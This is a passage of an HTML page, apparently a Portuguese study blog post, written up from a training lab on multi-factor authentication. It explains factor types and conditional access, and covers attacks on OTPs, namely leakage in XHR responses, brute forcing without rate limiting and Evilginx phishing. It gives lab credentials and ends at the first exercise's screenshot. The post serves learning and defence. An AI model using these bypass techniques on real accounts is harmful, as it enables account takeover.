+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#aplicativo-vazando-o-token-2fa">Aplicativo Vazando o Token 2FA.
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#brute-forcing-em-otp">Brute Forcing em OTP
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#falta-de-limita%c3%a7%c3%a3o-de-taxa">Falta de limitação de taxa
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#uso-do-evilginx">Uso do Evilginx
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pergunta-2">Pergunta
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#vazamento-de-otp---pr%c3%a1tica">Vazamento de OTP - Prática
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#valida%c3%a7%c3%a3o-server-side--ou-retorno-de-dados-sens%c3%adveis">Validação Server-Side  ou retorno de dados sensíveis
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#falta-de-pr%c3%a1ticas-de-seguran%c3%a7a-adequadas">Falta de práticas de segurança adequadas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#depura%c3%a7%c3%a3o-de-informa%c3%a7%c3%b5es-deixadas-na-produ%c3%a7%c3%a3o">Depuração de informações deixadas na produção
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#explora%c3%a7%c3%a3o">Exploração
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#codifica%c3%a7%c3%a3o-insegura---pr%c3%a1tica">Codificação Insegura - Prática
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#falha-l%c3%b3gica-ou-codifica%c3%a7%c3%a3o-insegura">Falha lógica ou codificação insegura?
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#explora%c3%a7%c3%a3o-1">Exploração
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#se-profundando-no-c%c3%b3digo">Se profundando no código
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#vencendo-o-recurso-de-logout-autom%c3%a1tico">Vencendo o recurso de logout automático
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#raz%c3%b5es-comuns-para-esse-comportamento">Razões comuns para esse comportamento
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#invalida%c3%a7%c3%a3o-de-sess%c3%a3o">Invalidação de Sessão
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pol%c3%adticas-de-limita%c3%a7%c3%a3o-de-taxa-e-bloqueio">Políticas de limitação de taxa e bloqueio
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#redirecionamento-orientado-%c3%a0-seguran%c3%a7a">Redirecionamento orientado à segurança
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#automatiza%c3%a7%c3%a3o-%c3%a9-a-chave">Automatização é a chave
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#velocidade">Velocidade
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#consist%c3%aancia">Consistência
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#recuperando-se-de-logouts">Recuperando-se de logouts
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#explora%c3%a7%c3%a3o-2">Exploração
+        </a>
+      </li></ul><ul></ul>
+      <div class="hx:mt-8 hx:border-t hx:bg-white hx:pt-8 hx:shadow-[0_-12px_16px_white] hx:dark:bg-dark hx:dark:shadow-[0_-12px_16px_#111] hx:sticky hx:bottom-0 hx:flex hx:flex-col hx:items-start hx:gap-2 hx:pb-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-t hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:border-neutral-400">
+        <button id="backToTop" tabindex="-1" class="hx:cursor-pointer hx:transition-all hx:duration-75 hx:opacity-0 hx:text-xs hx:font-medium hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-100 hx:contrast-more:text-gray-800 hx:contrast-more:dark:text-gray-50">
+          <span>Voltar ao topo</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:inline hx:ltr:ml-1 hx:rtl:mr-1 hx:h-3.5 hx:w-3.5 hx:rounded-full hx:border hx:border-gray-500 hx:hover:border-gray-900 hx:dark:border-gray-400 hx:dark:hover:border-gray-100 hx:contrast-more:border-gray-800 hx:contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx:w-full hx:break-words hx:flex hx:min-h-[calc(100vh-var(--hextra-navbar-height))] hx:min-w-0 hx:justify-center hx:pb-8 hx:pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main id="content" class="hx:w-full hx:min-w-0 hextra-max-content-width hx:px-6 hx:pt-4 hx:md:px-12">
+        
+        
+        <br class="hx:mt-1.5 hx:text-sm" />
+        <h1 class="hx:text-center hx:mt-2 hx:text-4xl hx:font-bold hx:tracking-tight hx:text-slate-900 hx:dark:text-slate-100">Multi-Factor Authentication</h1>
+        <div class="hx:mb-16"></div>
+        <div class="content">
+          
+          <h2 data-hextra-search-id="introdução">Introdução<span class="hx:absolute hx:-mt-20" id="introdução"></span>
+    <a href="#introdu%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Multi-Factor Authentication (MFA) tem uma papel importante em aplicações modernas, adicionando uma camada extra de proteção contra ataques. MFA utiliza diferentes combinações, por exemplo:</p>
+<ul>
+<li>Senha.</li>
+<li>Algo que você tem (celular).</li>
+<li>Algo que você possui (biometria).</li>
+</ul>
+<p>O objetivo da aula é entender melhor, os conceitos de MFA, como também sua importância no fortalecimento da segurança. Além de explorar diferentes tipos de fatores de autenticação utilizando MFA, ao final da aula teremos um melhor entendimento sobre essa tecnologia, através de estudo em cenários práticos onde o MFA é implementado para proteger informações sensíveis.</p>
+<h2 data-hextra-search-id="como-mfa-funciona">Como MFA funciona<span class="hx:absolute hx:-mt-20" id="como-mfa-funciona"></span>
+    <a href="#como-mfa-funciona" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>É importante saber que o 2FA (segundo fator de autenticação) faz parte do MFA, quando dizemos MFA estamos nos referindo ao processo de autenticação, que solicita dois ou mais fatores para verificar a identidade.</p>
+<h3 data-hextra-search-id="tipo-de-fator-de-autenticação">Tipo de fator de autenticação<span class="hx:absolute hx:-mt-20" id="tipo-de-fator-de-autenticação"></span>
+    <a href="#tipo-de-fator-de-autentica%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>MFA combina dois os mais tipos de credenciais, para realizar a autenticação, são eles:</p>
+<ul>
+<li><code>Conhecimento</code>: senha, PIN, ou outra coisa que você lembra.</li>
+<li><code>Posse</code>: smartcard, celular com app de autenticação, etc.</li>
+<li><code>Herança</code>: biometrica, íris, impressões digitais.</li>
+<li><code>Localização</code>: geolocalização, IP de origem.</li>
+<li><code>Comportamento</code>: aplicação analisa o comportamento do usuário, para restringir interações de bot.</li>
+</ul>
+<p>2FA utiliza dois tipos de fatores, dos citados acima, todo 2FA é um MFA, porém nem todo MFA é um 2FA.</p>
+<h2 data-hextra-search-id="tipos-de-2fa">Tipos de 2FA<span class="hx:absolute hx:-mt-20" id="tipos-de-2fa"></span>
+    <a href="#tipos-de-2fa" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>2FA pode utilizar vários mecanismos para garantir que cada fator de autenticação forneça uma camada de segurança robusta. Alguns dos métodos mais comuns incluem:</p>
+<ul>
+<li><strong>Time-Based One Time Passwords (TOTP)</strong>: senhas temporárias que são trocadas a cada 30 segundos ou mais.</li>
+<li><strong>Push Notifications</strong>: aplicativos como DUO ou Google Prompt enviam uma solicitação de login para celular.</li>
+<li><strong>SMS</strong>: a maioria dos aplicativos utilizam esse método, o sistema envia uma mensagem de texto com um código temporário para o número de celular do usuário.</li>
+<li><strong>Hardware Tokens</strong>: dispositivos com YubiKeys geram um <em>one-time passcode</em> ou utilizam autenticação por NFC.</li>
+</ul>
+<h3 data-hextra-search-id="acesso-condicional">Acesso Condicional<span class="hx:absolute hx:-mt-20" id="acesso-condicional"></span>
+    <a href="#acesso-condicional" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O acesso condicional é normalmente usado por empresas para ajustar os requisitos de autenticação com base em diferentes contextos. É como uma árvore de decisão que aciona verificações de segurança extras dependendo de certas condições. Por exemplo:</p>
+<h4 data-hextra-search-id="baseado-na-localização">Baseado na Localização<span class="hx:absolute hx:-mt-20" id="baseado-na-localização"></span>
+    <a href="#baseado-na-localiza%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Se o usuário está acessando o sistema, do local habitual que já acessa, é solicitado somente as credenciais de acesso. Caso esteja em algum outro local, o sistema pode solicitar outras verificações: OTP ou biometria .</p>
+<h4 data-hextra-search-id="baseado-em-tempo">Baseado em Tempo<span class="hx:absolute hx:-mt-20" id="baseado-em-tempo"></span>
+    <a href="#baseado-em-tempo" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Durante um acesso em horário regular de trabalho, o sistema pode solicitar apenas as credenciais de acesso. Em horário fora do expediente, pode ser adicionado uma cama extra de segurança, como por exemplo: OTP ou tokens de segurança.</p>
+<h4 data-hextra-search-id="análise-por-comportamento">Análise por Comportamento<span class="hx:absolute hx:-mt-20" id="análise-por-comportamento"></span>
+    <a href="#an%c3%a1lise-por-comportamento" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Suponha que o comportamento de um usuário mude repentinamente, como se ele começasse a acessar dados que normalmente não visualiza ou acessa em horários estranhos. Nesse caso, o sistema pode pedir autenticação adicional para confirmar que é realmente ele.</p>
+<h3 data-hextra-search-id="adoção-global-e-impulso-regulatório">Adoção Global e Impulso Regulatório<span class="hx:absolute hx:-mt-20" id="adoção-global-e-impulso-regulatório"></span>
+    <a href="#ado%c3%a7%c3%a3o-global-e-impulso-regulat%c3%b3rio" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>A adoção do MFA está se expandindo rapidamente em vários setores devido à sua eficácia na proteção contra muitas ameaças comuns de segurança, incluindo phishing, engenharia social e ataques baseados em senha. Governos e indústrias em todo o mundo estão reconhecendo a importância do MFA e estão começando a exigir seu uso por meio de várias estruturas regulatórias. Por exemplo, os setores financeiro e de saúde agora estão implementando requisitos rigorosos de MFA para cumprir com regulamentações como GDPR na Europa, HIPAA nos Estados Unidos e PCI-DSS para sistemas de pagamento globalmente.</p>
+<h3 data-hextra-search-id="pergunta">Pergunta<span class="hx:absolute hx:-mt-20" id="pergunta"></span>
+    <a href="#pergunta" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p><strong>When logging in to the application, you receive an SMS on your phone containing the OTP. What authentication factor is this?</strong><br>
+Resposta:<code>Something you have</code></p>
+<h2 data-hextra-search-id="implementações-e-aplicações">Implementações e Aplicações<span class="hx:absolute hx:-mt-20" id="implementações-e-aplicações"></span>
+    <a href="#implementa%c3%a7%c3%b5es-e-aplica%c3%a7%c3%b5es" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>A autenticação multifator (MFA) é agora um fator importante para manter nossas atividades online e offline protegidas de agentes de ameaças</p>
+<h3 data-hextra-search-id="mfa-bancos">MFA Bancos<span class="hx:absolute hx:-mt-20" id="mfa-bancos"></span>
+    <a href="#mfa-bancos" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Os bancos lidam com informações e transações incrivelmente sensíveis todos os dias. Ao usar o MFA, os bancos podem proteger as informações pessoais e financeiras dos usuários contra roubo cibernético, fraude e outras ameaças online. Normalmente, os bancos pedem que você insira uma senha (algo que você sabe) antes de passar para uma segunda camada de segurança, que é um código enviado por SMS ou gerado por um aplicativo no seu telefone (algo que você tem). Dessa forma, mesmo que alguém tenha sua senha, ele ainda precisará dessa informação extra para acessar sua conta ou concluir uma transação.</p>
+<h3 data-hextra-search-id="mfa-em-saúde">MFA em Saúde<span class="hx:absolute hx:-mt-20" id="mfa-em-saúde"></span>
+    <a href="#mfa-em-sa%c3%bade" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Na área da saúde, devido a regulamentações como a HIPAA nos EUA, a MFA garante que os registros de pacientes e informações pessoais de saúde sejam acessíveis apenas por pessoas autorizadas. Por exemplo, para acessar sistemas sensíveis como registros eletrônicos de saúde (EHRs), os provedores de saúde podem exigir que um médico use um crachá de segurança (algo que eles têm) e uma digitalização de impressão digital (algo que eles são). Isso garante que apenas aqueles com as credenciais corretas possam visualizar ou alterar os dados do paciente.</p>
+<h3 data-hextra-search-id="mfa-em-ti-corporativa">MFA em TI Corporativa<span class="hx:absolute hx:-mt-20" id="mfa-em-ti-corporativa"></span>
+    <a href="#mfa-em-ti-corporativa" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Com o número crescente de ataques cibernéticos e violações de dados, os departamentos de TI no mundo corporativo estão sob intensa pressão para proteger dados comerciais confidenciais e manter a integridade do sistema. O MFA ajuda a mitigar o risco de acesso não autorizado que pode levar ao roubo de dados, espionagem ou sabotagem. Em um ambiente corporativo, o MFA é normalmente usado ao acessar redes, bancos de dados e serviços de nuvem da empresa. Os funcionários podem primeiro fazer login com suas credenciais corporativas (algo que eles sabem) e, em seguida, verificar sua identidade com um código enviado para o telefone fornecido pela empresa (algo que eles têm) ou por meio de verificação biométrica (algo que eles são). Dessa forma, mesmo que alguém tente atacar seu sistema, eles encontrarão um obstáculo sem o segundo fator.</p>
+<h3 data-hextra-search-id="pergunta-1">Pergunta<span class="hx:absolute hx:-mt-20" id="pergunta-1"></span>
+    <a href="#pergunta-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p><strong>Is MFA an important factor in keeping our online and offline activities safe from threat actors? (yea/nay)</strong><br>
+Resposta:<code>yea</code></p>
+<h2 data-hextra-search-id="vulnerabilidades-comuns-em-mfa">Vulnerabilidades comuns em MFA<span class="hx:absolute hx:-mt-20" id="vulnerabilidades-comuns-em-mfa"></span>
+    <a href="#vulnerabilidades-comuns-em-mfa" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><h3 data-hextra-search-id="fraqueza-no-algoritmo-de-geração-do-otp">Fraqueza no Algoritmo de Geração do OTP<span class="hx:absolute hx:-mt-20" id="fraqueza-no-algoritmo-de-geração-do-otp"></span>
+    <a href="#fraqueza-no-algoritmo-de-gera%c3%a7%c3%a3o-do-otp" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>A segurança de uma Senha Única (OTP) é tão forte quanto o algoritmo usado para criá-la. Se o algoritmo for fraco ou muito previsível, ele pode facilitar o trabalho do invasor tentando adivinhar a OTP.</p>
+<h3 data-hextra-search-id="aplicativo-vazando-o-token-2fa">Aplicativo Vazando o Token 2FA.<span class="hx:absolute hx:-mt-20" id="aplicativo-vazando-o-token-2fa"></span>
+    <a href="#aplicativo-vazando-o-token-2fa" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Devido à codificação insegura, alguns aplicativos também podem vazar o token 2FA na resposta. Um cenário comum é quando um usuário, após o login, chega à página 2FA, o aplicativo acionará uma solicitação XHR para um endpoint que emite o OTP. Às vezes, essa solicitação XHR retorna o OTP de volta para o usuário dentro da resposta HTTP.</p>
+<h3 data-hextra-search-id="brute-forcing-em-otp">Brute Forcing em OTP<span class="hx:absolute hx:-mt-20" id="brute-forcing-em-otp"></span>
+    <a href="#brute-forcing-em-otp" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Embora OTPs sejam projetados para uso único, eles não são imunes a ataques de força bruta. Se um invasor puder fazer suposições ilimitadas, ele pode eventualmente obter o OTP correto, especialmente se o OTP não estiver bem protegido por medidas de segurança adicionais.</p>
+<h4 data-hextra-search-id="falta-de-limitação-de-taxa">Falta de limitação de taxa<span class="hx:absolute hx:-mt-20" id="falta-de-limitação-de-taxa"></span>
+    <a href="#falta-de-limita%c3%a7%c3%a3o-de-taxa" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Sem limitação de taxa adequada, um aplicativo fica aberto a invasores para continuar tentando diferentes OTPs sem dificuldade. Se um invasor puder enviar vários palpites em um curto período de tempo, isso aumenta a probabilidade de que o invasor consiga obter o OTP correto.</p>
+<h4 data-hextra-search-id="uso-do-evilginx">Uso do Evilginx<span class="hx:absolute hx:-mt-20" id="uso-do-evilginx"></span>
+    <a href="#uso-do-evilginx" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Evilginx é uma ferramenta que é tipicamente usada <em>red teams</em>. Como pode ser usada para executar ataques de phishing sofisticados, efetivamente ignorando a Autenticação Multifator (MFA). Ela opera como um proxy man-in-the-middle que pode interceptar e redirecionar OTPs destinados a usuários legítimos.</p>
+<h3 data-hextra-search-id="pergunta-2">Pergunta<span class="hx:absolute hx:-mt-20" id="pergunta-2"></span>
+    <a href="#pergunta-2" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p><strong>What can be implemented to help prevent brute-forcing OTPs?</strong><br>
+Resposta: <code>rate limiting</code></p>
+<h2 data-hextra-search-id="vazamento-de-otp---prática">Vazamento de OTP - Prática<span class="hx:absolute hx:-mt-20" id="vazamento-de-otp---prática"></span>
+    <a href="#vazamento-de-otp---pr%c3%a1tica" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Vazamento de token OTP em uma resposta XHR (XMLHttpRequest) ocorre devido a uma implementação incorreta no 2FA ou codificação insegura. Algumas razões comuns por que isso ocorre são:</p>
+<h3 data-hextra-search-id="validação-server-side--ou-retorno-de-dados-sensíveis">Validação Server-Side  ou retorno de dados sensíveis<span class="hx:absolute hx:-mt-20" id="validação-server-side--ou-retorno-de-dados-sensíveis"></span>
+    <a href="#valida%c3%a7%c3%a3o-server-side--ou-retorno-de-dados-sens%c3%adveis" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Em alguns aplicativos mal projetados, o servidor valida o OTP e, em vez de apenas confirmar o sucesso ou a falha, ele retorna o próprio OTP na resposta. Isso geralmente é feito de forma não intencional, como parte de depuração, registro ou práticas inadequadas de tratamento de respostas.</p>
+<h3 data-hextra-search-id="falta-de-práticas-de-segurança-adequadas">Falta de práticas de segurança adequadas<span class="hx:absolute hx:-mt-20" id="falta-de-práticas-de-segurança-adequadas"></span>
+    <a href="#falta-de-pr%c3%a1ticas-de-seguran%c3%a7a-adequadas" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Os desenvolvedores podem ignorar as implicações de segurança de expor informações sensíveis como OTP nas respostas da API. Isso geralmente acontece quando os desenvolvedores estão focados em tornar o aplicativo funcional sem considerar como os invasores podem explorar essas respostas.</p>
+<h3 data-hextra-search-id="depuração-de-informações-deixadas-na-produção">Depuração de informações deixadas na produção<span class="hx:absolute hx:-mt-20" id="depuração-de-informações-deixadas-na-produção"></span>
+    <a href="#depura%c3%a7%c3%a3o-de-informa%c3%a7%c3%b5es-deixadas-na-produ%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Durante o processo de desenvolvimento e teste, os desenvolvedores deixam mensagem de depuração, tornado-o assim o desenvolvimento mais fácil para identificar possíveis falhas ou bug, o problema é que muitas vezes essas informações não são removidas no software que será usado em produção. Se essas respostas de depuração não forem removidas antes da implantação na produção, informações confidenciais, como OTPs, poderão ser expostas.</p>
+<h3 data-hextra-search-id="exploração">Exploração<span class="hx:absolute hx:-mt-20" id="exploração"></span>
+    <a href="#explora%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Acessar o endereço: <code>http://mfa.thm/labs/first</code></p>
+<p>Credenciais de acesso:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center">Username</th>
+					<th>Password</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><a
+    href="mailto:thm@mail.thm">thm@mail.thm</a></td>
+					<td>test123</td>
+			</tr>
+	</tbody>
+</table>
+<p>Antes de realizar o login devemos abrir a ferramenta de desenvolvedor Web do navegador (F12).
+Na aba de &ldquo;Network&rdquo; iremos acompanhar todas requisições, depois que clicarmos em &ldquo;Login&rdquo;</p>
+<p><img src="/assets/img/posts/2025/02/MFA/leak-otp.png" alt="Leak OTP"  loading="lazy" /></p>
